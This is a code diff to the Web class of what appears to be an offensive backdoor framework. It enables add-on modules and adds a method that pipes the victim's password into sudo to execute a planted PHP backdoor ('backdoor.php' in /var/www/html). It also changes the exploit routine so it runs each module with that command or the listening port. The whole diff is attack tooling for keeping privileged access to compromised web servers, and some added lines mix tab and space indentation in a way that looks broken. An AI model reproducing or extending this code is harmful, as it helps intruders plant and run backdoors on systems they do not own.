@@ -11,7 +11,16 @@ class Web(Backdoor):
                 "port"   : Option("port", 53929, "port to connect to", True),
                 "name"   : Option("name", "backdoor.php", "name of backdoor", True),
 		}
-        self.allow_modules = False
+        self.allow_modules = True
+	self.portModules = {}
+	self.modules = {}
+
+    def get_port(self):
+        return self.get_value("port")
+
+    def get_command(self):
+        return "echo " + self.core.curtarget.pword + " | sudo -S php /var/www/html/" + self.get_value("name")
+
 
     def do_exploit(self, args):
         port = self.get_value("port")
@@ -34,4 +43,10 @@ class Web(Backdoor):
         print("> exploit\n")
         print("Then visit the site at " + target.hostname + "/" + name)
         print("To begin your session, type sessions -i [session id]")
+	for mod in self.modules.keys():
+            print(INFO + "Attempting to execute " + mod.name + " module...")
+            mod.exploit(self.get_command())
+        for mod in self.portModules.keys():
+            print(INFO + "Attempting to execute " + mod.name + " module...")
+            mod.exploit(self.get_port())
   
